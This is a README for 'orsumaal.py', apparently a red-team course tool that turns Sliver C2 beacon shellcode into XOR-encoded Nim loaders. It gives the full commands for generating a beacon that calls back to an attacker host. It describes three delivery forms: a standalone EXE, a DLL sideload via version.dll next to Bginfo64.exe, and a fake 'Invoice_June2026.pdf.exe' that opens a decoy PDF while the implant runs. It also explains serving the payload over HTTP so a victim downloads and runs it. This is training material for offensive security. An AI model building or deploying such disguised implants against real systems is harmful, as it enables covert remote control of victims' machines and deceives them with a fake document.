# 02.1 - Orsumaal: Automated Payload Generator

**Developed by Vamsi Krishna Orsu**

`orsumaal.py` automates everything from Module 02 that happens after you generate your Sliver beacon. Instead of manually writing Nim files, running XOR encoders, compiling with the right flags, and generating icons — run one script, answer three questions, and get a ready-to-deploy payload.

---

## Prerequisites

Before running the script, you need two things ready on Kali:

### 1. Sliver Beacon Shellcode

Generate it inside the Sliver console:

```bash
sudo systemctl start sliver
sliver
```

```
sliver > https --lhost 192.168.10.10 --lport 443
sliver > generate beacon --http https://192.168.10.10:443 --os windows --arch amd64 --format shellcode --shellcode-encoder none --skip-symbols --seconds 30 --jitter 10 --save /tmp/beacon.bin
```

Wait 30-90 seconds for compilation. Verify:

```bash
ls -la /tmp/beacon.bin
```

### 2. Copy the Script to Kali

From your host machine:

```bash
scp tools/orsumaal.py kali@192.168.10.10:/tmp/orsumaal.py
```

## Usage

```bash
python3 /tmp/orsumaal.py
```

The script walks you through everything interactively:

```
┌──────────────────────────────────────────────────────────────┐
│  Configuration                                               │
│  ? Kali IP [192.168.10.10]:                                  │
│  ? HTTP server port [8888]:                                  │
│  ? XOR key (hex) [AB]:                                       │
│                                                              │
│  ? Select attack type                                        │
│     1. Standalone EXE                                        │
│     2. DLL Sideload                                          │
│     3. Fake PDF                                              │
│  > Choose [1-3]:                                             │
└──────────────────────────────────────────────────────────────┘
```

### Attack Type 1: Standalone EXE

Generates `loader.exe`. Drop it in `C:\Windows\Temp\` on the victim and run it.

```
Files generated:
  /tmp/beacon_encoded.bin
  /tmp/loader.exe
```

### Attack Type 2: DLL Sideload

Generates `version.dll`. Place it next to `Bginfo64.exe` with a renamed copy of the real `version.dll`.

```
Files generated:
  /tmp/beacon_encoded.bin
  /tmp/version.dll
```

### Attack Type 3: Fake PDF

Asks for a path to any real PDF file you want to use as the decoy. Generates an EXE with a PDF icon that opens the real PDF on screen while running the beacon in the background.

```
? Path to decoy PDF file: ~/Desktop/vamsi.pdf

Files generated:
  /tmp/beacon_encoded.bin
  /tmp/decoy_invoice.pdf
  /tmp/Invoice_June2026.pdf.exe
```

## After Generation

The script prints the exact commands you need. In general:

**Terminal 1** — Sliver (already running from prerequisites)

**Terminal 2** — HTTP server:

```bash
cd /tmp && python3 -m http.server 8888
```

**Terminal 3** — On the victim, download and run. The exact commands depend on the attack type and are printed by the script.

## What the Script Does Internally

| Step | What Happens |
|------|-------------|
| Preflight | Checks that `beacon.bin`, `nim`, `mingw`, and (for PDF) `ImageMagick` exist |
| XOR encode | Reads `/tmp/beacon.bin`, XOR-encodes every byte, writes `/tmp/beacon_encoded.bin` |
| Write Nim source | Generates the `.nim` file with your IP, port, and XOR key injected |
| Compile | Runs `nim c -d:mingw -d:release ...` with the correct flags per attack type |
| (PDF only) Icon | Uses ImageMagick to create a red PDF icon, compiles it to `.res` with `windres` |

## What the Script Does NOT Do

- Start Sliver or the HTTPS listener (you do this manually)
- Generate `beacon.bin` (you do this in Sliver)
- Start the HTTP server (it prints the command, you run it)
- Transfer files to the victim (it prints the command)
- Execute anything on the victim
